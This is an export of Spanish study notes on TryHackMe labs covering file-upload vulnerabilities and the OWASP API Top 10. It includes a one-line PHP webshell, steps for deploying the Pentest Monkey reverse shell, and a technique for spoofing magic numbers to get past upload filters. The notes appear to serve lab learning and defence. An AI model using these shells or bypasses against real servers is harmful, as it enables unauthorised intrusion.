`/uploads`. Intentaremos subir la imagen del perrito de la tarea anterior.\n\n![[Pasted image 20251214170838.png]]\n\n![[Pasted image 20251214170845.png]]\n\nAhora, si vamos a `http://demo.uploadvulns.thm/uploads`, deber√≠amos ver que la imagen se ha subido.\n\n![[Pasted image 20251214170922.png]]\n\n![[Pasted image 20251214170941.png]]\n\nVale, podemos subir im√°genes. Intent√©moslo con una webshell ahora.\n\nSabemos que este servidor web corre con un backend PHP, por lo que podemos empezar con la creaci√≥n de la shell, en un entorno real puede que tengamos que realizar m√°s enumeraci√≥n.\n\nUna webshell simple funciona tomando un par√°metro y ejecut√°ndolo como comando de sistema. En PHP, la sintaxis ser√≠a:\n\n```php\n<?php\necho system($_GET[\"cmd\"]);\n?>\n```\n\nEste c√≥digo toma el par√°metro GET cmd y lo ejecuta como comando. Luego muestra el output por pantalla. Probemos a subirla y a ejecutar alg√∫n comando.\n\n![[Pasted image 20251214171444.png]]\n\nHa funcionado, por lo que ahora podr√≠amos usar esta webshell para leer archivos en el sistema o para mejorarla a una reverse shell.\n\n>[!NOTE] Cuando tenemos una webshell, muchas veces es m√°s legible mirar el c√≥digo fuente de la p√°gina.\n\n----------------------------------\n<h2>Reverse Shells</h2>\nEl proceso de subir una reverse shell es casi id√©ntico al de subir una webshell. Usaremos la reverse shell de Pentest Monkey que viene por defecto en Kali, aunque tambi√©n la puedes descargar [aqu√≠](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).\n\nNecesitas editar la l√≠nea 49, que ahora mismo dice `$ip = '127.0.0.1'; //CHANGE THIS`. Lo siguiente que debemos hacer es arrancar un listener en el puerto que elijamos.\n\n![[Pasted image 20251214172414.png]]\n\nAhora subimos la shell y la activamos navegando a ella: `http://demo.uploadvulns.thm/uploads/shell.php`. El nombre de la shell ser√° el que nosotros le pongamos (`php-reverse-shell.php` por defecto).\n\n![[Pasted image 20251214172528.png]]\n\n---------------------------------------\nAhora navega a `shell.uploadvulns.thm` y completa esta tarea.\n\n1. Vamos a la p√°gina.\n   ![[Pasted image 20251214175129.png]]\n2. Hacemos un escaneo con `gobuster`.\n   ![[Pasted image 20251214180746.png]]\n   Podemos intuir que lo que subimos se est√° guardando en `/resources`.\n3. Hacemos una webshell en php.\n   ![[Pasted image 20251214180958.png]]\n4. La subimos.\n   ![[Pasted image 20251214181029.png]]\n   ![[Pasted image 20251214181055.png]]\n   Se ha subido exitosamente.\n5. Navegamos hasta la shell y le metemos un comando (`whoami`) para comprobar que funciona.\n   ![[Pasted image 20251214181154.png]]\n6. Vamos a leer el contenido de `/var/www` con `ls /var/www`.\n   ![[Pasted image 20251214181239.png]]\n7. Leemos el contenido de la flag con `cat /var/www/flag.txt`.\n   ![[Pasted image 20251214181319.png]]",
    "modified": "2025-12-15T00:55:45"
  },
  {
    "title": "9. Bypassing Server-Side Filtering - Magic Numbers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/9-bypassing-server-side-filtering-magic-numbers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/9. Bypassing Server-Side Filtering - Magic Numbers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Ya hemos visto el filtrado de extensiones del lado del servidor, pero vamos a aprovechar para ver c√≥mo se comprueban los magic numbers del lado del servidor tambi√©n.\n\nLos magic numbers se utilizan para identificar los archivos de manera m√°s precisa. El magic number de un archivo es una string de d√≠gitos hexadecimales y es siempre la primera parte de un archivo. De esta manera, leyendo los primeros bytes de un archivo y compar√°ndolos con una whitelist o blacklist, podemos verificar si el archivo es o no leg√≠timo para su subida.\n\n>[!IMPORTANT] Esta t√©cnica puede ser efectiva contra servidores basados en PHP pero puede fallar contra otros tipos de servidores web.\n\nVeamos un ejemplo. Como generalmente, tenemos una p√°gina de subida.\n\n![[Pasted image 20251217135821.png]]\n\nComo es esperado, si subimos una shell.php, obtendremos un error. Sin embargo, si subimos un JPEG, el sitio web lo acepta.\n\nDel intento anterior sabemos que los archivos JPEG son aceptados, por lo que le meteremos los magic numbers de JPEG a nuestro `shell.php`. Una vista r√°pida a la [lista de firmas de la Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) muestra que hay varias posibilidades de magic numbers para archivos JPEG. No deber√≠a importar cu√°l usemos aqu√≠, as√≠ que elegiremos uno (`FF D8 FF DB`). Podr√≠amos a√±adir la representaci√≥n ASCII de estos caracteres (`√ø√ò√ø√õ`) al principio del documento, pero es m√°s f√°cil trabajar directamente en hexadecimal.\n\nAntes de empezar, usaremos el comando `file` para comprobar el tipo de archivo de shell.php:\n\n![[Pasted image 20251218111141.png]]\n\nObviamente nos dice que es un archivo PHP. Ahora vamos a a√±adir 4 caracteres (porque el magic number que hemos seleccionado son 4 caracteres) al inicio del documento. No importa qu√© caracteres sean.\n\n![[Pasted image 20251218111513.png]]\n\nAhora vamos a abrirlo con `hexeditor` o cualquier otra herramienta que permita editar en hexadecimal.\n\n![[Pasted image 20251218111555.png]]\n\nPor lo que se ve la \"A\" se representa como 41 en hezadecimal. Vamos a cambiar las 4 \"A\"s por magic numbers.\n\n![[Pasted image 20251218111640.png]]\n\nSi ahora usamos el comando `file`:\n\n![[Pasted image 20251218111829.png]]\n\nAhora vamos a subir la shell.\n\n![[Pasted image 20251218111849.png]]\n\nAh√≠ lo tenemos, hemos bypasseado el filtro basado en magic numbers del lado del servidor y obtenido una reverse shell.\n\n---------------------------------------\nVe a `magic.uploadvulns.thm` y encuentra la flag en `/var/www/`.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251218115633.png]]\n2. Vamos a escanear la p√°gina con `gobuster`.\n   ![[Pasted image 20251218121545.png]]\n3. Vamos a probar a subir nuestra reverse shell del tir√≥n.\n   ![[Pasted image 20251218115909.png]]\n   Parece que s√≥lo admiten GIFs.\n4. Vamos a la [p√°gina de firmas de la Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) y buscamos por GIF.\n   ![[Pasted image 20251218120019.png]]\n5. Abrimos nuestro archivo shell y le metemos 6 caracteres cualquiera.\n   ![[Pasted image 20251218120113.png]]\n6. Abrimos el documento con `hexeditor`.\n   ![[Pasted image 20251218120156.png]]\n7. Cambiamos los \"42\" por los caracteres seleccionados, por ejemplo `47 49 46 38 37 61`.\n   ![[Pasted image 20251218120320.png]]\n8. Guardamos y comprobamos con `file`.\n   ![[Pasted image 20251218120358.png]]\n9. Subimos el archivo \"GIF\".\n   ![[Pasted image 20251218120620.png]]\n10. Nos ponemos en escucha.\n    ![[Pasted image 20251218121624.png]]\n11. Intentamos navegar a nuestra shell, que estar√° en `/graphics`.\n    ![[Pasted image 20251218121730.png]]\n    Hemos recibido la reverse shell.\n12. Vamos a leer la flag.\n    ![[Pasted image 20251218121829.png]]",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "2. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/2-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/2. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "La capacidad de subir archivos a un servidor se ha vuelto una parte integral de c√≥mo interactuamos con las aplicaciones web. Ya sea una foto de perfil, un reporte o un proyecto.\n\nSi no se maneja correctamente, la subida de archivos puede generar vulnerabilidades severas en el servidor. Esto puede llevar a cualquier cosa relativamente menor hasta RCE si un atacante consiguiese subir y ejecutar una shell. Adem√°s podr√≠a hacer un deface de la p√°gina o sustituir enlaces o contenido con el fin de provocar un CSRF o un XSS.",
    "modified": "2025-12-14T00:57:26"
  },
  {
    "title": "3. General Methodology",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/3-general-methodology/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/3. General Methodology.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Bien, ya tenemos un punto de subida de archivos en una p√°gina web. ¬øC√≥mo lo explotamos?\n\nComo con cualquier tipo de hacking, la enumeraci√≥n es clave. Cuanto m√°s entendamos sobre nuestro entorno, m√°s seremos capaces de hacer con esa informaci√≥n. Algunas buenas ideas son:\n\n- Mirar el c√≥digo fuente de la p√°gina.\n- Escanear directorios con fuerza bruta (`gobuster`, por ejemplo).\n- Interceptar peticiones de subida de archivos con BurpSuite.\n- Extensiones como Wappalyzer pueden ofrecer informaci√≥n valiosa en un vistazo.\n\nCon un entendimiento b√°sico de c√≥mo la web trata nuestro input, podemos tratar de tocar por algunos sitios y ver qu√© y qu√© no podemos subir. Si el sitio web usa filtros del lado del cliente, podemos buscar estos filtros e intentar bypassearlos. Si usa filtros del lado del servidor, debemos adivinar qu√© busca el filtro e intentar algo ligeramente diferente. Subir archivos destinados a provocar errores puede ser muy √∫til. Herramientas como Burp Suite u OWASP Zap pueden ser de gran ayuda en esta fase.",
    "modified": "2025-12-14T00:57:26"
  },
  {
    "title": "4. Overwriting Existing Files",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/4-overwriting-existing-files/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/4. Overwriting Existing Files.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Cuando se suben archivos a un servidor, se deber√≠an de hacer un n√∫mero de comprobaciones para asegurar que el archivo no sobrescribir√° nada que ya exista en el servidor. Una pr√°ctica com√∫n es asignar un nombre al archivo ya sea aleatorio o con la fecha y hora de subida. Si un archivo con el mismo nombre ya existe, el servidor debe mandar un mensaje de error conforme ese nombre ya existe. Tambi√©n son relevantes los permisos ya que un archivo que contenga la web no deber√≠a ser escribible por el usuario.\n\nSi no se toman dichas precauciones, podemos ser capaces de sobrescribir archivos existentes en el servidor. \n\n>[!CAUTION] Usaremos `demo.uploadvulns.thm` para todas las demostraciones. Es puramente para prop√≥sitos demostrativos y no est√° disponible en la m√°quina virtual.\n\nEn la siguiente imagen tenemos una p√°gina web con un formulario de subida.\n\n![[Pasted image 20251213142409.png]]\n\nPuede que necesites enumerar m√°s que esto para un reto real. Sin embargo, por esta vez, miraremos el c√≥digo fuente de la p√°gina.\n\n![[Pasted image 20251213142556.png]]\n\nAqu√≠ podemos ver el c√≥digo responsable de representar la imagen que vemos. Sale de un archivo llamado `spaniel.jpg` dentro de un directorio llamado `images`.\n\nLa pregunta aqu√≠ es: ¬øpodemos sobrescribirlo?\n\nVamos a descargarnos una imagen diferente y a llamarla `spaniel.jpg`.\n\n![[Pasted image 20251213142900.png]]\n\nAhora la subimos a ver qu√© pasa.\n\n![[Pasted image 20251213142914.png]]\n\nNuestro ataque ha sido exitoso. Hemos conseguido sobrescribir el archivo `images/spaniel.jpg` con nuestra propia copia.\n\n-------------------------------------------\nAhora pong√°moslo a prueba. Abre el navegador y navega a `http://overwrite.uploadvulns.thm`. Tu objetivo es sobrescribir el archivo con uno tuyo.\n\n1. Navegamos a la direcci√≥n dada.\n   ![[Pasted image 20251213143124.png]]\n2. Inspeccionamos el c√≥digo fuente con `Ctrl + U`.\n   ![[Pasted image 20251213143158.png]]\n   Aqu√≠ podemos ver que el fondo cargado es una imagen llamada `mountains.jpg` cargada desde el directorio `images`.\n3. Vamos a descargarnos una imagen y a llamarla de la misma forma.\n   ![[Pasted image 20251213143334.png]]\n4. Le damos a `Select File`, seleccionamos la imagen que nos acabamos de descargar y le damos a `Upload`.\n   ![[Pasted image 20251213143448.png]]\n5. Obtenemos la flag.\n   ![[Pasted image 20251213143507.png]]",
    "modified": "2025-12-14T00:57:26"
  },
  {
    "title": "10. Example Methodology",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/10-example-methodology/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/10. Example Methodology.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Hemos visto varios tipos de filtro ya, tanto del lado del cliente como del lado del servidor. En la pr√≥xima tarea realizaremos un reto black-box, as√≠ que vamos a ver c√≥mo es una metodolog√≠a de acercamiento para este tipo de reto.\n\n1. Lo primero que deber√≠amos hacer es mirar la p√°gina web entera. Usando extensiones de navegador como Wappalyzer, o a mano, buscar√≠amos indicadores de lenguages y frameworks que usan las aplicaciones web. Un buen comienzo manual ser√≠a mandar una petici√≥n a la web e interceptarla con Burp Suite buscando headers como `server` o `x-powered-by`. Tambi√©n buscar√≠amos vectores potenciales de ataque.\n2. Habiendo encontrado una p√°gina de subida, intentar√≠amos inspeccionarla m√°s a fondo. Mirando el c√≥digo fuente en busca de scripts del lado del cliente para determinar si hay alg√∫n tipo de filtro del lado del cliente.\n3. Luego intentar√≠amos subir un archivo completamente inocente. Desde ah√≠ buscar√≠amos a ver c√≥mo se accede a nuestro archivo. En este paso es donde herramientas como `gobuster` entran en juego. Este paso es extremadamente importante pues no s√≥lo nos da un mejor entendimiento de la web, sino que nos da una idea de archivos aceptados en los que podemos basar nuestra investigaci√≥n futura. Un par√°metro muy √∫til es `-x`, que nos permite listar archivos, Por ejemplo con `-x php,txt,html`.\n4. Sabiendo c√≥mo y d√≥nde se suben nuestros archivos, intentar√≠amos una subida de archivos maliciosa, bypasseando cualquier filtro del lado del cliente. Seg√∫n el error que devuelva el servidor har√≠amos una cosa u otra.\n\nAsumiendo que nuestro archivo ha sido parado por el servidor, aqu√≠ tienes algunas formas de asegurarte qu√© tipo de filtros del lado del servidor hay:\n\n- Si puedes subir un archivo con una extensi√≥n totalmente inv√°lida (`test.invalidfileextension`),  lo m√°s probable es que el servidor est√© usando una blacklist para filtrar extensiones.\n- Prueba a subir el archivo inocente de nuevo pero cambia los magic numbers. Si falla, sabes que el servidor usa un filtro de magic numbers.\n- Ahora prueba a resubir tu archivo inocente pero intercepta la petici√≥n en Burp Suite y cambia el tipo MIME a algo que esperar√≠as que fuese filtrado. Si falla sabes que el filtro est√° basado en tipos MIME.\n- Enumerar tama√±o de archivos se basa en empezar subiendo un archivo peque√±o e ir incrementando su tama√±o hasta dar con el l√≠mite.",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "3. Vulnerability I - Broken Object Level Authorisation (BOLA)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/3-vulnerability-i-broken-object-level-authorisation-bola/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/3. Vulnerability I - Broken Object Level Authorisation (BOLA).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nGeneralmente, los endpoints de las APIs se utilizan para recuperar y manipular informaci√≥n a trav√©s de identificadores. BOLA se refiere al Insecure Direct Object Reference (IDOR), que crea un escenario donde el usuario usa la funcionalidad de input y obtiene acceso al recurso que no est√°n autorizados a acceder. En una API, dichos controles son implementados normalmente mediante la programaci√≥n en modelos (Arquitectura Model-View-Controller) a nivel de c√≥digo.\n\n---------------------------------\n<h2>Impacto Posible</h2>\nLa ausencia de controles para prevenir el acceso no autorizado a objetos puede llevar a una exfiltraci√≥n de informaci√≥n y en algunos casos a la p√©rdida total de control sobre la cuenta. La informaci√≥n de los usuarios o suscriptores juega un papel cr√≠tico en la reputaci√≥n de la marca. Si dicha informaci√≥n se filtra, resultar√° en una gran p√©rdida econ√≥mica.\n\n--------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. Bob est√° trabajando como desarrollador API en la compa√±√≠a MHT y desarroll√≥ un endpoint en `/apirule1/users/{ID}` que permite a otras aplicaciones o desarrolladores pedir informaci√≥n mandando el ID de un empleado.\n   ![[Pasted image 20251208181013.png]]\n2. El problema con el endpoint es que no est√° validando la llamada para saber si es v√°lida o no y tampoco si la persona haciendo la llamada tiene el permiso para hacerla.\n3. La soluci√≥n a este problema es bastante sencillo. Bob debe implementar un mecanismo de autorizaci√≥n a trav√©s del cual identificar qui√©n puede hacer qu√© llamadas a la API.\n4. Esto se consigue mediante **tokens de autorizaci√≥n o de acceso** en el header. Despu√©s de esto, s√≥lo introducir un token de autorizaci√≥n v√°lido te dar√° acceso a los resultados.\n   ![[Pasted image 20251208181018.png]]\n\n-------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Un mecanismo de autorizaci√≥n que conf√≠e en pol√≠ticas de usuario y jerarqu√≠as deber√≠a de ser implementado adecuadamente.\n- Controles de acceso estricto para comprobar si el usuario registrado est√° autorizado para realizar acciones espec√≠ficas.\n- Promover el uso de valores completamente aleatorios para que sean imposibles de predecir.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Vulnerability IV - Lack of Resources & Rate Limiting",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/6-vulnerability-iv-lack-of-resources-rate-limiting/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/6. Vulnerability IV - Lack of Resources & Rate Limiting.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nLa falta de recursos y limitaci√≥n de frecuencia significa que la API no aplica ninguna restricci√≥n en cuanto a la frecuencia de los recursos pedidos, lo que afecta negativamente al rendimiento del servidor API y lleva a DoS. Imagina un escenario donde la API no est√© limitada y un intruso pueda subir varios GB a la vez o mandar el n√∫mero de peticiones por segundo que el quiera.\n\n-----------------------------\n<h2>Impacto Posible</h2>\nEl ataque apunta a la disponibilidad de los sitios. Sin embargo puede perjudicar la reputaci√≥n de la marca y causar p√©rdidas monetarias.\n\n-------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. La compa√±√≠a ha comprado un plan de marketing email (20000 al mes) para mandar emails de marketing, recuperaci√≥n de contrase√±as, etc. Bob se ha dado cuenta de que ha desarrollado el login de la API exitosamente pero debe haber una opci√≥n de olvid√© mi contrase√±a.\n2. Ha comenzado a construir el endpoint `/apirule4/sendOTP_v` que mandar√° 4 d√≠gitos al email del usuario. Un usuario autentificado podr√° usar el One Time Password (OTP) para recuperar la contrase√±a.\n   ![[Pasted image 20251208201057.png]]\n3. El problema aqu√≠ es que Bob no ha habilitado la frecuencia de acceso del endpoint. Un actor malicioso puede escribir un script que bruteforcee el endpoint mandando muchos emails en segundos usando el plan recientemente comprado por la compa√±√≠a.\n4. Finalmente a Bob se le ha ocurrido una soluci√≥n inteligente `/apirule4/sendOTP_s` y ha activado la limitaci√≥n de frecuencia de acceso a 2 minutos para volver a pedir otro OTP.\n\n--------------------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Asegura usar un captcha paras evitar peticiones de scripts automatizados y bots.\n- Asegura la limitaci√≥n de la frecuencia de acceso al endpoint por tiempo y notifica inmediatamente cuando se sobrepase.\n- Asegura definir el tama√±o m√°ximo de informaci√≥n en todos los par√°metros y payloads, como la longitud m√°xima de string y el m√°ximo n√∫mero de elementos del array.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "Open WorldWide Application Security Project (OWASP) es una comunidad online y colaborativa sin √°nimo de lucro que busca mejorar la seguridad de aplicaci√≥n mediante un conjuntos de principios de seguridad, art√≠culos, documentaci√≥n, etc. En 2019, OWASP public√≥ el top 10 de vulnerabilidades en APIs.\n\n---------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[0. Protocols and Servers 2]]\n- [[0. Principles of Security]]\n- [[Ciberseguridad/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n\n--------------------------\n<h2>Credenciales</h2>\n- Username: `Administrator`\n- Password: `Owasp@123`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OWASP API Security Top 10 - 1",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/0-owasp-api-security-top-10-1/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/0. OWASP API Security Top 10 - 1.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/1. Introduction]]\n[[2. Understanding APIs - A Refresher]]\n[[3. Vulnerability I - Broken Object Level Authorisation (BOLA)]]\n[[4. Vulnerability II - Broken User Authentication (BUA)]]\n[[5. Vulnerability III - Excessive Data Exposure]]\n[[6. Vulnerability IV - Lack of Resources & Rate Limiting]]\n[[7. Vulnerability V - Broken Function Level Authorisation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Understanding APIs - A Refresher",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/2-understanding-apis-a-refresher/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/2. Understanding APIs - A Refresher.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "<h2>¬øQu√© es una API y Por Qu√© es Importante?</h2>\nAPI significa Application Programming Interface. Es un medio que facilita la comunicaci√≥n de dos componentes de software usando un conjunto de protocolos y definiciones. En el contexto de una API, una **Application** se refiere a cualquier software que tiene una funcionalidad espec√≠fica e **Interface** se refiere a contrato entre dos apps que hace la comunicaci√≥n posible mediante peticiones y respuestas. La documentaci√≥n de cada API recoge c√≥mo han estructurado dichas peticiones y respuestas los desarrolladores. **Las APIs son los bloques con los que se construyen aplicaciones complejas de nivel empresarial.**\n\n-------------------------\n<h2>Brechas de Seguridad Recientes a trav√©s de APIs</h2>\n- **LinkedIn:** en Junio de 2021, los datos de m√°s de 700 millones de usuarios de LinkedIn fueron puestos en venta en un foro de la dark web, los cuales fueron recopilados mediante la API de LinkedIn. El hacker public√≥ un registro de 1 mill√≥n para confirmar la legitimidad del ataque.\n- **Twitter (X):** En Junio de 2022, la informaci√≥n de m√°s de 5,4 millones de usuarios de Twitter fue puesta a la venta en la dark web. Los hacker explotaron un zero-day en la API de Twitter.\n- **PIXLR:** En Enero de 2021, PXLR sufri√≥ una brecha de datos que impact√≥ a 1,9 millones de usuarios. Toda la informaci√≥n fue dumpeada por los hackers en un foro de la dark web.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Vulnerability V - Broken Function Level Authorisation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/7-vulnerability-v-broken-function-level-authorisation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/7. Vulnerability V - Broken Function Level Authorisation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nBroken Function Level Authorization refleja un escenario donde un usuario con bajos privilegios bypassea las comprobaciones del sistema y consigue acceso a informaci√≥n confidencial haci√©ndose pasar por un usuario con altos privilegios. Considera el escenario de un control de acceso con pol√≠ticas complejas con varias jerarqu√≠as, roles y grupos y una separaci√≥n difusa entre funciones administrativas y regulares. Un atacante podr√≠a aprovecharse de estos problemas para acceder a recursos no autorizados de otro usuario o funciones administrativas.\n\n---------------------------\n<h2>Impacto Posible</h2>\nEl ataque apunta principalmente los principios de seguridad y no repudio. Puede llevar al atacante a hacerse pasar por un usuario autorizado y darle permisos administrativos.\n\n----------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. A Bob le han asignado la tarea de desarrollar un panel de administraci√≥n para los ejecutivos de la compa√±√≠a para que puedan ver los detalles de usuarios y tareas espec√≠ficas.\n2. Bob ha desarrollado un endpoint `/apirule5/users_v` para recopilar la informaci√≥n de los usuarios de la base de datos. Para incrementar la protecci√≥n, ha a√±adido otra capa de seguridad a√±adiendo un header especial `isAdmin` en cada petici√≥n. La API solo recopila informaci√≥n de usuarios si `isAdmin=1` y el `Authorizatio-Token` es correcto. El token de autorizaci√≥n de Alice (HR) es `YWxpY2U6dGVzdCFAISM6Nzg5Nzg=`.\n   ![[Pasted image 20251208203645.png]]\n3. Podemos ver que Alice no es un user Admin pero puede ver los datos de los empleados configurando peticiones personalizadas al endpoint con `isAdmin=1`.\n4. El problema puede resolverse implementando reglas de autorizaci√≥n correctas y comprobando su los roles funcionales de cada usuario en la base de datos durante la query. Bob ha implementado otro endpoint `/apirule5/users_s` que valida el rol de cada usuario adem√°s de lo anterior.\n\n----------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Asegura dise√±o correcto y comprobaci√≥n de todos los sistemas de autorizaci√≥n y denegaci√≥n de acceso.\n- Asegura que las operaciones s√≥lo se permiten a aquellos usuarios que corresponda.\n- Aseg√∫rate de revisar los endpoints API en busca de debilidades de nivel de autorizaci√≥n y ten en cuenta las apps y los grupos de jerarqu√≠a.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Vulnerability II - Broken User Authentication (BUA)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/4-vulnerability-ii-broken-user-authentication-bua/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/4. Vulnerability II - Broken User Authentication (BUA).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nLa autentificaci√≥n del usuario es el n√∫cleo del desarrollo de cualquier aplicaci√≥n que contenga informaci√≥n sensible. Broken User Authentication (BUA) refleja un escenario donde un endpoint API permite a un atacante acceder a la base de datos u obtener privilegios m√°s elevados de los que merece. La principal raz√≥n detr√°s de BUA es una implementaci√≥n inv√°lida de la autentificaci√≥n como usar emails incorrectos, contrase√±as, queries, etc. O la ausencia de seguridad como headers de autentificaci√≥n.\n\n----------------------------------\n<h2>Impacto Posible</h2>\nLos atacantes pueden comprometer la sesi√≥n autentificada o el mecanismo de autentificaci√≥n y f√°cilmente acceder a informaci√≥n sensible. Pueden pretender ser alguien autorizado y realizar actividades no deseadas incluyendo un control total de la cuenta.\n\n-------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. Bob entiende que la autentificaci√≥n es cr√≠tica y se le encarga desarrollar un endpoint API `apirule2/user/login_v` que autentificar√° al obtener un email y una contrase√±a.\n2. El endpoint devolver√° un token, que ser√° pasado como `Authorization-Token` header (GET) a `apirule2/user/Details` para mostrar los detalles del usuario espec√≠fico.\n3. Bob desarroll√≥ el endpoint. Sin embargo, se olvid√≥ de validar la contrase√±a, por lo que ahora s√≥lo necesitas el email de un usuario para obtener sus detalles. Pru√©balo mandando una petici√≥n POST a `http://localhost:80/MHT/apirule2/user/login_v` con los par√°metros `email` y `password`.\n   ![[Pasted image 20251208181042.png]]\n4. Como podemos ver, el endpoint vulnerable recibi√≥ un token que puede ser redirigido a `/apirule2/user/details` para 